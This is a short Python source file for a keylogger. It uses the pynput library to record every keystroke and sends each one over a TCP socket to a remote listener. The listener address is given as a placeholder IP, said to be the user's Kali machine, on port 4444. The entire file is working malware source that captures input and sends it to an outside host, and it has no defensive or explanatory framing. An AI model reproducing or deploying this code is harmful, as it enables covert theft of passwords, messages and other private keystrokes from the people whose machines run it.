import pynput
from pynput.keyboard import Key, Listener
import socket

# Specify remote server details
REMOTE_HOST = '192.168.x.x'  # Replace with your Kali machine's IP
REMOTE_PORT = 4444

# Global variable for socket
sock = None

def establish_connection():
    global sock
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((REMOTE_HOST, REMOTE_PORT))
        print("Connection established")
    except Exception as e:
        print(f"Error establishing connection: {e}")

def send_data(data):
    if sock:  # Check if the socket is established
        try:
            sock.sendall(data.encode('utf-8'))
        except Exception as e:
            print(f"Error sending data: {e}")
    else:
        print("Connection not established")

def on_press(key):
    try:
        key_data = f"{key.char}"
    except AttributeError:
        key_data = f"{str(key)}"
    
    send_data(key_data)

def on_release(key):
    if key == Key.esc:
        # Stop listener and close the socket
        if sock:
            sock.close()
        return False

# Main function to start the listener and connection
def start_keylogger():
    establish_connection()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Start the keylogger
if __name__ == "__main__":
    start_keylogger()
